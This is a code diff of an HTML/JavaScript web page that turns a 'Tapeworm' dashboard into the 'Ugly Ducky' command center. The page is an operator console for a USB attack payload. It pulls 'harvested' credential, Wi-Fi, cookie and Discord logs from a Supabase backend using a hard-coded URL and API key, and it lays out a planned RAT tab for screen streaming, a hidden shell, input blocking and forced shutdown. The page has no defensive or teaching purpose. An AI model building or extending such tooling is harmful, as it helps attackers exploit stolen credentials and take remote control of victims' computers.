@@ -3,84 +3,344 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Dashboard | Forensics</title>
+    <title>Ugly Ducky | Command Center</title>
+    
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Inter', 'sans-serif'], mono: ['JetBrains Mono', 'monospace'], },
+                    colors: { dark: '#0B0F19', panel: '#151C2C', neon: '#ff4757', neonHover: '#ff6b81' } // Changed theme color to a "hacker red/orange" to match the Ugly Ducky marker
+                }
+            }
+        }
+    </script>
+
     <style>
-        body { background-color: #121212; color: #00ffcc; font-family: 'Courier New', Courier, monospace; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; }
-        input, button { padding: 10px; font-family: inherit; background: #222; color: #00ffcc; border: 1px solid #00ffcc; }
-        button { cursor: pointer; background: #004433; }
-        button:hover { background: #00ffcc; color: #000; }
-        .card { background: #1e1e1e; border-left: 4px solid #00ffcc; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word;}
-        .timestamp { color: #888; font-size: 0.8em; }
-        .category { font-weight: bold; color: #fff; margin-bottom: 10px; }
+        body { background-color: #0B0F19; color: #e2e8f0; }
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #0B0F19; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
+
+        .glass-panel { background: rgba(21, 28, 44, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .fade-in { animation: fadeIn 0.4s ease-in-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .text-glow { text-shadow: 0 0 10px rgba(255, 71, 87, 0.5); }
+        
+        /* Tab switching transitions */
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s ease-in-out; }
     </style>
 </head>
-<body>
+<body class="min-h-screen flex flex-col font-sans antialiased selection:bg-neon selection:text-white">
 
-<div class="container">
-    <h1>[ TAPEWORM DATA DASHBOARD ]</h1>
-    <p>Enter your hardware Device ID to view harvested logs.</p>
-    
-    <input type="text" id="deviceId" placeholder="e.g. DUCK-ALPHA-001" autocomplete="off">
-    <button onclick="fetchData()">Access Terminal</button>
+    <!-- Navbar -->
+    <nav class="glass-panel border-b border-gray-800 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-center md:justify-between h-16">
+                <div class="flex items-center gap-3">
+                    <i class="fa-solid fa-duck text-neon text-2xl text-glow"></i>
+                    <span class="font-bold text-xl tracking-wider text-white uppercase">Ugly<span class="text-neon">Ducky</span></span>
+                </div>
+                <!-- Removed right side text as requested -->
+            </div>
+        </div>
+    </nav>
 
-    <div id="output"></div>
-</div>
-
-<script>
-    // --- SUPABASE CONFIGURATION ---
-    const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
-    const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
-
-    async function fetchData() {
-        const deviceId = document.getElementById('deviceId').value;
-        const outputDiv = document.getElementById('output');
+    <!-- Main Content -->
+    <main class="flex-grow max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full">
         
-        if (!deviceId) {
-            alert("Please enter a Device ID.");
-            return;
+        <!-- Navigation Tabs -->
+        <div class="flex justify-center mb-10 fade-in">
+            <div class="glass-panel p-1 rounded-lg inline-flex">
+                <button onclick="switchTab('extraction')" id="tab-extraction" class="px-6 py-2.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-lg">
+                    <i class="fa-solid fa-database mr-2"></i> Data Logs
+                </button>
+                <button onclick="switchTab('rat')" id="tab-rat" class="px-6 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white">
+                    <i class="fa-solid fa-network-wired mr-2"></i> Live Control (RAT)
+                </button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- TAB 1: DATA EXTRACTION (Existing Feature)  -->
+        <!-- ========================================== -->
+        <div id="view-extraction" class="tab-content active">
+            <div class="text-center mb-8">
+                <h1 class="text-3xl md:text-4xl font-bold text-white mb-3">Offline <span class="text-neon text-glow">Harvesting</span></h1>
+                <p class="text-gray-400">Authenticate with your device ID to view extracted credential logs.</p>
+            </div>
+
+            <!-- Input Section -->
+            <div class="max-w-xl mx-auto glass-panel p-6 rounded-2xl shadow-xl mb-8">
+                <label class="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">Enter Device ID</label>
+                <div class="flex gap-3">
+                    <div class="relative flex-grow">
+                        <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                            <i class="fa-solid fa-hashtag text-gray-500"></i>
+                        </div>
+                        <input type="text" id="deviceId" placeholder="e.g. 4426" autocomplete="off" 
+                            class="block w-full pl-11 pr-4 py-3 bg-[#0B0F19] border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-neon focus:border-transparent transition-all font-mono text-lg">
+                    </div>
+                    <button onclick="fetchData()" id="connectBtn" class="bg-neon hover:bg-neonHover text-white font-bold py-3 px-6 rounded-lg transition-all flex items-center gap-2 shadow-[0_0_15px_rgba(255,71,87,0.4)]">
+                        Fetch
+                    </button>
+                </div>
+                <p id="statusMsg" class="mt-3 text-sm text-gray-400 hidden"></p>
+            </div>
+
+            <!-- Filters -->
+            <div id="filterContainer" class="hidden max-w-7xl mx-auto mb-6 flex flex-wrap gap-2 justify-center border-b border-gray-800 pb-6"></div>
+
+            <!-- Results -->
+            <div id="output" class="grid grid-cols-1 lg:grid-cols-2 gap-6 pb-20"></div>
+        </div>
+
+
+        <!-- ========================================== -->
+        <!-- TAB 2: LIVE CONTROL (Future Feature UI)    -->
+        <!-- ========================================== -->
+        <div id="view-rat" class="tab-content">
+            <div class="text-center mb-8">
+                <h1 class="text-3xl md:text-4xl font-bold text-white mb-3">Live <span class="text-neon text-glow">Session</span> Control</h1>
+                <p class="text-gray-400">Real-time interaction and system manipulation. <span class="text-neon font-bold">(In Development)</span></p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                
+                <!-- Target Selection Panel -->
+                <div class="md:col-span-1 glass-panel p-6 rounded-xl h-fit">
+                    <h2 class="font-bold text-lg border-b border-gray-700 pb-3 mb-4"><i class="fa-solid fa-crosshairs text-neon mr-2"></i>Active Targets</h2>
+                    <div class="space-y-3">
+                        <div class="p-3 border border-gray-700 rounded-lg bg-[#0B0F19] flex justify-between items-center cursor-not-allowed opacity-50">
+                            <div>
+                                <p class="text-sm font-bold">DESKTOP-Q1A2Z</p>
+                                <p class="text-xs text-gray-500">192.168.1.45</p>
+                            </div>
+                            <span class="w-3 h-3 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444]"></span>
+                        </div>
+                        <p class="text-xs text-gray-500 italic text-center mt-4">Waiting for reverse connection payload...</p>
+                    </div>
+                </div>
+
+                <!-- Action Grid -->
+                <div class="md:col-span-2 glass-panel p-6 rounded-xl">
+                    <div class="flex justify-between items-center border-b border-gray-700 pb-3 mb-4">
+                        <h2 class="font-bold text-lg"><i class="fa-solid fa-bolt text-neon mr-2"></i>Execution Commands</h2>
+                        <span class="text-xs font-mono bg-gray-800 px-2 py-1 rounded text-gray-400">STATUS: OFFLINE</span>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <button class="bg-[#1a2235] hover:bg-[#252f4a] border border-gray-700 p-4 rounded-lg text-left transition-all group opacity-60 cursor-not-allowed">
+                            <i class="fa-solid fa-desktop text-2xl mb-2 text-gray-400 group-hover:text-neon transition-colors"></i>
+                            <h3 class="font-bold text-white">Live Screen</h3>
+                            <p class="text-xs text-gray-500">Stream target's display</p>
+                        </button>
+                        
+                        <button class="bg-[#1a2235] hover:bg-[#252f4a] border border-gray-700 p-4 rounded-lg text-left transition-all group opacity-60 cursor-not-allowed">
+                            <i class="fa-solid fa-keyboard text-2xl mb-2 text-gray-400 group-hover:text-neon transition-colors"></i>
+                            <h3 class="font-bold text-white">Block Inputs</h3>
+                            <p class="text-xs text-gray-500">Lock remote mouse & keyboard</p>
+                        </button>
+
+                        <button class="bg-[#1a2235] hover:bg-[#252f4a] border border-gray-700 p-4 rounded-lg text-left transition-all group opacity-60 cursor-not-allowed">
+                            <i class="fa-solid fa-terminal text-2xl mb-2 text-gray-400 group-hover:text-neon transition-colors"></i>
+                            <h3 class="font-bold text-white">Hidden Shell</h3>
+                            <p class="text-xs text-gray-500">Background cmd/powershell</p>
+                        </button>
+
+                        <button class="bg-[#1a2235] hover:bg-[#252f4a] border border-gray-700 p-4 rounded-lg text-left transition-all group opacity-60 cursor-not-allowed">
+                            <i class="fa-solid fa-power-off text-2xl mb-2 text-gray-400 group-hover:text-neon transition-colors"></i>
+                            <h3 class="font-bold text-white">Power Options</h3>
+                            <p class="text-xs text-gray-500">Force shutdown or restart</p>
+                        </button>
+                    </div>
+
+                    <!-- Fake Terminal Output -->
+                    <div class="mt-6 bg-[#0B0F19] rounded-lg p-4 border border-gray-800 font-mono text-sm text-gray-400 h-32 overflow-hidden">
+                        <p>> System initialized.</p>
+                        <p>> Loading RAT interface modules...</p>
+                        <p>> Listening for incoming TCP connections on port 4444...</p>
+                        <p class="animate-pulse">> _</p>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed bottom-5 right-5 bg-gray-800 border-l-4 border-neon text-white px-6 py-4 rounded shadow-2xl transition-transform transform translate-y-24 opacity-0 z-50 flex items-center gap-3">
+        <i class="fa-solid fa-circle-check text-neon"></i>
+        <span id="toastMsg">Copied!</span>
+    </div>
+
+    <script>
+        // --- TAB LOGIC ---
+        function switchTab(tabId) {
+            // Hide all contents
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            // Reset all buttons
+            document.getElementById('tab-extraction').className = "px-6 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white";
+            document.getElementById('tab-rat').className = "px-6 py-2.5 rounded-md font-semibold text-sm transition-all text-gray-400 hover:text-white";
+            
+            // Activate selected content
+            document.getElementById('view-' + tabId).classList.add('active');
+            // Style active button
+            document.getElementById('tab-' + tabId).className = "px-6 py-2.5 rounded-md font-semibold text-sm transition-all bg-neon text-white shadow-lg";
         }
 
-        outputDiv.innerHTML = "<p>Connecting to secure database...</p>";
+        // --- DATA EXTRACTION LOGIC ---
+        const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
+        const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
+        let globalData = [];
 
-        try {
-            // Fetch data from Supabase where device_id equals the user's input
-            const response = await fetch(`${SUPABASE_URL}?device_id=eq.${deviceId}&order=created_at.desc`, {
-                method: 'GET',
-                headers: {
-                    'apikey': SUPABASE_KEY,
-                    'Authorization': `Bearer ${SUPABASE_KEY}`,
-                    'Content-Type': 'application/json'
-                }
-            });
+        document.getElementById("deviceId").addEventListener("keypress", function(e) {
+            if (e.key === "Enter") { e.preventDefault(); fetchData(); }
+        });
 
-            const data = await response.json();
-
-            if (data.length === 0) {
-                outputDiv.innerHTML = "<p>No data found for this Device ID. Make sure the payload was executed successfully.</p>";
-                return;
-            }
-
-            outputDiv.innerHTML = "";
+        async function fetchData() {
+            const deviceId = document.getElementById('deviceId').value.trim();
+            const outputDiv = document.getElementById('output');
+            const statusMsg = document.getElementById('statusMsg');
+            const btn = document.getElementById('connectBtn');
+            const filterContainer = document.getElementById('filterContainer');
             
-            // Loop through and display data
-            data.forEach(item => {
+            if (!deviceId) return showToast("Please enter a Device ID.", "error");
+
+            statusMsg.classList.remove('hidden');
+            statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-neon mr-2"></i>Querying database...';
+            btn.disabled = true;
+            outputDiv.innerHTML = "";
+            filterContainer.classList.add('hidden');
+
+            try {
+                const response = await fetch(`${SUPABASE_URL}?device_id=eq.${deviceId}&order=created_at.desc`, {
+                    method: 'GET',
+                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' }
+                });
+
+                if (!response.ok) throw new Error("API Error");
+
+                globalData = await response.json();
+
+                if (globalData.length === 0) {
+                    statusMsg.innerHTML = '<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>No data logged for this ID.';
+                } else {
+                    statusMsg.innerHTML = `<i class="fa-solid fa-check text-green-500 mr-2"></i>Found ${globalData.length} records.`;
+                    buildFilters();
+                    renderCards(globalData);
+                }
+            } catch (error) {
+                statusMsg.innerHTML = `<i class="fa-solid fa-xmark text-red-500 mr-2"></i>Connection failed.`;
+            } finally {
+                btn.disabled = false;
+            }
+        }
+
+        function buildFilters() {
+            const container = document.getElementById('filterContainer');
+            container.innerHTML = '';
+            container.classList.remove('hidden');
+
+            const categories = [...new Set(globalData.map(item => item.category))];
+            container.appendChild(createFilterBtn('All', true));
+            categories.forEach(cat => container.appendChild(createFilterBtn(cat, false)));
+        }
+
+        function createFilterBtn(text, isActive) {
+            const btn = document.createElement('button');
+            const activeClasses = 'bg-neon text-white font-bold shadow-[0_0_10px_rgba(255,71,87,0.4)] border-neon';
+            const inactiveClasses = 'bg-panel text-gray-400 border-gray-700 hover:text-white hover:border-gray-500';
+            
+            btn.className = `px-4 py-2 rounded-full border text-sm transition-all duration-200 filter-btn ${isActive ? activeClasses : inactiveClasses}`;
+            btn.innerText = text;
+            
+            btn.onclick = () => {
+                document.querySelectorAll('.filter-btn').forEach(b => b.className = `px-4 py-2 rounded-full border text-sm transition-all duration-200 filter-btn ${inactiveClasses}`);
+                btn.className = `px-4 py-2 rounded-full border text-sm transition-all duration-200 filter-btn ${activeClasses}`;
+                renderCards(text === 'All' ? globalData : globalData.filter(item => item.category === text));
+            };
+            return btn;
+        }
+
+        function renderCards(data) {
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML = '';
+
+            data.forEach((item, index) => {
+                let icon = 'fa-file-code';
+                if(item.category.includes('Wi-Fi')) icon = 'fa-wifi';
+                if(item.category.includes('System')) icon = 'fa-server';
+                if(item.category.includes('Password') || item.category.includes('Cred')) icon = 'fa-key';
+                if(item.category.includes('Cookie')) icon = 'fa-cookie-bite';
+                if(item.category.includes('Discord')) icon = 'fa-discord';
+
                 const card = document.createElement('div');
-                card.className = 'card';
+                card.className = `glass-panel rounded-xl overflow-hidden fade-in flex flex-col h-full`;
+                card.style.animationDelay = `${index * 0.05}s`;
+                
                 card.innerHTML = `
-                    <div class="category">[CATEGORY: ${item.category}]</div>
-                    <div class="timestamp">Logged at: ${new Date(item.created_at).toLocaleString()}</div>
-                    <hr style="border: 0; border-top: 1px solid #333; margin: 10px 0;">
-                    <div>${item.content}</div>
+                    <div class="px-5 py-4 border-b border-gray-800 flex justify-between items-center bg-[#1a2235]">
+                        <div class="flex items-center gap-3">
+                            <div class="w-8 h-8 rounded-full bg-gray-800 flex items-center justify-center border border-gray-700">
+                                <i class="fa-solid ${icon} text-neon"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-white tracking-wide">${item.category}</h3>
+                                <p class="text-xs text-gray-500">${new Date(item.created_at).toLocaleString()}</p>
+                            </div>
+                        </div>
+                        <button onclick="copyData(this)" class="text-gray-400 hover:text-neon transition-colors p-2"><i class="fa-regular fa-copy text-lg"></i></button>
+                    </div>
+                    <div class="p-5 flex-grow bg-[#0f1423]">
+                        <pre class="font-mono text-sm text-gray-300 whitespace-pre-wrap break-all max-h-[300px] overflow-y-auto hidden-data">${item.content}</pre>
+                    </div>
                 `;
                 outputDiv.appendChild(card);
             });
-
-        } catch (error) {
-            outputDiv.innerHTML = `<p style="color:red;">Error connecting to database.</p>`;
         }
-    }
-</script>
 
+        function copyData(btnElement) {
+            const dataToCopy = btnElement.closest('.glass-panel').querySelector('.hidden-data').innerText;
+            navigator.clipboard.writeText(dataToCopy).then(() => {
+                showToast("Data copied to clipboard!");
+                const icon = btnElement.querySelector('i');
+                icon.className = "fa-solid fa-check text-green-400 text-lg";
+                setTimeout(() => icon.className = "fa-regular fa-copy text-lg", 2000);
+            });
+        }
+
+        function showToast(message, type="success") {
+            const toast = document.getElementById('toast');
+            const icon = toast.querySelector('i');
+            document.getElementById('toastMsg').innerText = message;
+            
+            if(type === "error") {
+                toast.classList.replace('border-neon', 'border-red-500');
+                icon.className = "fa-solid fa-triangle-exclamation text-red-500";
+            } else {
+                toast.classList.replace('border-red-500', 'border-neon');
+                icon.className = "fa-solid fa-circle-check text-neon";
+            }
+
+            toast.classList.replace('translate-y-24', 'translate-y-0');
+            toast.classList.replace('opacity-0', 'opacity-100');
+            setTimeout(() => {
+                toast.classList.replace('translate-y-0', 'translate-y-24');
+                toast.classList.replace('opacity-100', 'opacity-0');
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
